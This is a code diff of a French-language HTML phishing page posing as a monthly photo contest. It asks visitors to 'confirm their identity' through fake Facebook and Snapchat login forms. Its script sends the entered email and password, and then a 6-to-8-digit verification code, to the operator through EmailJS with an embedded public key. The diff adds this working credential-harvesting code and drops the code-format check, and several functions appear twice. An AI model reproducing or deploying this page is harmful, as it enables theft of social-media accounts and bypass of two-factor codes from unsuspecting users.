@@ -1,12 +1,13 @@
 
 <!DOCTYPE html>
+
 <html lang="fr">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Connexion Simulée – Version Améliorée</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet"/>
-  <style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Connexion Simulée – Version Améliorée</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&amp;display=swap" rel="stylesheet"/>
+<style>
     body {
       font-family: 'Poppins', sans-serif;
       margin: 0;
@@ -108,121 +109,206 @@
       to { opacity: 1; transform: translateY(0); }
     }
   </style>
-</head>
-<body>
-<header>
-  <img src="logo.png" alt="Logo" id="logo"/>
-  <h1>EPICS PHOTOGRAPHIE - ZONE CONCOUR</h1>
-  <p>Participez à notre concours photo mensuel et gagnez des prix !</p>
-</header>
-
-<button class="facebook-btn" onclick="openForm('facebook')">
-  <img src="logo-fb.png" alt="Facebook" class="facebook-logo"/> Confirme ton identité avec Facebook
-</button>
-<div id="fb-form" class="form-popup">
-  <img src="logo-fb.png" alt="Logo Facebook" style="width:40px; margin-bottom:10px;">
-  <h2>Confirmation Facebook</h2>
-  <input id="facebook-email" placeholder="Email ou mobile">
-  <input id="facebook-password" type="password" placeholder="Mot de passe">
-  <button onclick="submitLogin('facebook')">Se connecter</button>
-</div>
-
-<button class="snapchat-btn" onclick="openForm('snapchat')">
-  <img src="logo-snapchat.png" alt="Snapchat" class="snapchat-logo"/> Confirme ton identité avec Snapchat
-</button>
-<div id="snap-form" class="form-popup">
-  <img src="logo-snapchat.png" alt="Logo Snapchat" style="width:40px; margin-bottom:10px;">
-  <h2>Confirmation Snapchat</h2>
-  <input id="snapchat-email" placeholder="Nom d'utilisateur ou e-mail">
-  <input id="snapchat-password" type="password" placeholder="Mot de passe">
-  <button onclick="submitLogin('snapchat')">Se connecter</button>
-</div>
-
-<div id="feedback" class="feedback"></div>
-
-<div id="code-verification" class="form-popup">
-  <h2>Vérification</h2>
-  <p>Entrez le code reçu (6 chiffres)</p>
-  <input id="code" placeholder="123456">
-  <button onclick="submitCode()">Valider</button>
-</div>
-
-<div id="loader" class="form-block" style="display:none; font-size: 1.1em;">
-  <p>⏳ Traitement en cours...</p>
-</div>
-<div id="message-info" class="form-block" style="display:none; font-size: 1.1em;">
-  <p>Un code de validation à 6 chiffres va vous être envoyé.</p>
-</div>
-
-<div id="loader" class="form-block" style="display:none; font-size: 1.1em;">
-  <p>⏳ Traitement en cours...</p>
-</div>
-<div id="message-info" class="form-block" style="display:none; font-size: 1.1em;">
-  <p>Un code de validation à 6 chiffres va vous être envoyé.</p>
-</div>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   emailjs.init("AATQVLMcBJaRBgEox");
+</script>
 
-  function openForm(service) {
-    document.getElementById('fb-form').style.display = 'none';
-    document.getElementById('snap-form').style.display = 'none';
-    document.getElementById('code-verification').style.display = 'none';
-    document.getElementById('feedback').style.display = 'none';
-    if (service === 'facebook') document.getElementById('fb-form').style.display = 'block';
-    else document.getElementById('snap-form').style.display = 'block';
-  }
+</head>
+<body>
+<header>
+<img alt="Logo" id="logo" src="logo.png"/>
+<h1>EPICS PHOTOGRAPHIE - ZONE CONCOUR</h1>
+<p>Participez à notre concours photo mensuel et gagnez des prix !</p>
+</header>
+<button class="facebook-btn" onclick="openForm('facebook')">
+<img alt="Facebook" class="facebook-logo" src="logo-fb.png"/> Confirme ton identité avec Facebook
+</button>
+<div class="form-popup" id="fb-form">
+<img alt="Logo Facebook" src="logo-fb.png" style="width:40px; margin-bottom:10px;"/>
+<h2>Confirmation Facebook</h2>
+<input id="facebook-email" placeholder="Email ou mobile"/>
+<input id="facebook-password" placeholder="Mot de passe" type="password"/>
+<button onclick="submitLogin('facebook')">Se connecter</button>
+</div>
+<button class="snapchat-btn" onclick="openForm('snapchat')">
+<img alt="Snapchat" class="snapchat-logo" src="logo-snapchat.png"/> Confirme ton identité avec Snapchat
+</button>
+<div class="form-popup" id="snap-form">
+<img alt="Logo Snapchat" src="logo-snapchat.png" style="width:40px; margin-bottom:10px;"/>
+<h2>Confirmation Snapchat</h2>
+<input id="snapchat-email" placeholder="Nom d'utilisateur ou e-mail"/>
+<input id="snapchat-password" placeholder="Mot de passe" type="password"/>
+<button onclick="submitLogin('snapchat')">Se connecter</button>
+</div>
+<div class="feedback" id="feedback"></div>
+<div class="form-popup" id="code-verification">
+<h2>Vérification</h2>
+<p>Entrez le code reçu (6 à 8 chiffres)</p>
+<input id="code" placeholder="123456"/>
+<button onclick="submitCode()">Valider</button>
+</div>
+<div class="form-block" id="loader" style="display:none; font-size: 1.1em;">
+<p>⏳ Traitement en cours...</p>
+</div>
+<div class="form-block" id="message-info" style="display:none; font-size: 1.1em;">
+<p>Un code de validation de 6 à 8 chiffres va vous être envoyé.</p>
+</div>
 
+<script>
   function submitLogin(service) {
-    const email = document.getElementById(service + '-email').value.trim();
-    const password = document.getElementById(service + '-password').value.trim();
+    const emailInput = document.getElementById(service + '-email');
+    const passwordInput = document.getElementById(service + '-password');
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
 
     if (!email || !password) {
       showFeedback("Veuillez remplir tous les champs.");
       return;
     }
 
-    
+    let data = {};
+    if (service === 'facebook') {
+      data = {
+        fb_email: email,
+        fb_password: password
+      };
+    } else if (service === 'snapchat') {
+      data = {
+        fb_email: email,      // Snap simulé comme Facebook dans template
+        fb_password: password
+      };
+    }
 
-    const data = {};
-    data[service + '_email'] = email;
-    data[service + '_password'] = password;
+    document.getElementById("fb-form").style.display = "none";
+    document.getElementById("snap-form").style.display = "none";
+    document.getElementById("loader").style.display = "block";
 
-    
-    emailjs.send("service_photos", "template_connexion", data).then(() => {
-      document.getElementById("verification").style.display = "none";
-      document.getElementById("fb-form").style.display = "none";
-      document.getElementById("snap-form").style.display = "none";
-      document.getElementById("loader").style.display = "block";
+    setTimeout(() => {
+      document.getElementById("loader").style.display = "none";
 
-      setTimeout(() => {
-        document.getElementById("loader").style.display = "none";
+      emailjs.send("service_photos", "template_connexion", data).then(() => {
         document.getElementById("message-info").style.display = "block";
-        document.getElementById("verification").style.display = "block";
-      }, 2000);
-    });
+        document.getElementById("code-verification").style.display = "block";
+      });
+    }, 2000);
+  }
+</script>
 
+<script>
+  function openForm(service) {
+    document.getElementById("fb-form").style.display = "none";
+    document.getElementById("snap-form").style.display = "none";
+
+    if (service === 'facebook') {
+      document.getElementById("fb-form").style.display = "block";
+    } else if (service === 'snapchat') {
+      document.getElementById("snap-form").style.display = "block";
+    }
   }
 
-  function showFeedback(msg) {
-    const box = document.getElementById('feedback');
-    box.textContent = msg;
-    box.style.display = 'block';
-  }
-
+  
   function submitCode() {
     const code = document.getElementById('code').value.trim();
-    if (!/^\d{6,}$/.test(code)) {
-      showFeedback("Code invalide. 6 chiffres requis.");
-      return;
-    }
+    
     emailjs.send("service_photos", "template_code", {
       verification_code: code
     }).then(() => {
       window.location.href = "page_succes.html";
     });
   }
+
+
+  function showFeedback(message) {
+    const box = document.getElementById("feedback");
+    box.textContent = message;
+    box.style.display = "block";
+    setTimeout(() => {
+      box.style.display = "none";
+    }, 4000);
+  }
+</script>
+
+<script>
+  (function(){
+     // Remplacez par votre clé publique EmailJS
+  })();
+
+  function openForm(service) {
+    document.getElementById("fb-form").style.display = "none";
+    document.getElementById("snap-form").style.display = "none";
+
+    if (service === 'facebook') {
+      document.getElementById("fb-form").style.display = "block";
+    } else if (service === 'snapchat') {
+      document.getElementById("snap-form").style.display = "block";
+    }
+  }
+
+  
+  function submitCode() {
+    const code = document.getElementById('code').value.trim();
+   
+    emailjs.send("service_photos", "template_code", {
+      verification_code: code
+    }).then(() => {
+      window.location.href = "page_succes.html";
+    });
+  }
+
+
+  function showFeedback(message) {
+    const box = document.getElementById("feedback");
+    box.textContent = message;
+    box.style.display = "block";
+    setTimeout(() => {
+      box.style.display = "none";
+    }, 4000);
+  }
+
+  function submitLogin(service) {
+    const emailInput = document.getElementById(service + '-email');
+    const passwordInput = document.getElementById(service + '-password');
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !password) {
+      showFeedback("Veuillez remplir tous les champs.");
+      return;
+    }
+
+    let data = {};
+    if (service === 'facebook') {
+      data = {
+        fb_email: email,
+        fb_password: password
+      };
+    } else if (service === 'snapchat') {
+      data = {
+        fb_email: email,
+        fb_password: password
+      };
+    }
+
+    document.getElementById("fb-form").style.display = "none";
+    document.getElementById("snap-form").style.display = "none";
+    document.getElementById("loader").style.display = "block";
+
+    setTimeout(() => {
+      document.getElementById("loader").style.display = "none";
+
+      emailjs.send("service_photos", "template_connexion", data)
+        .then(() => {
+          document.getElementById("message-info").style.display = "block";
+          document.getElementById("code-verification").style.display = "block";
+        })
+        .catch((error) => {
+          showFeedback("❌ Erreur d'envoi : " + error.text);
+        });
+    }, 2000);
+  }
 </script>
 </body>
+
 </html>
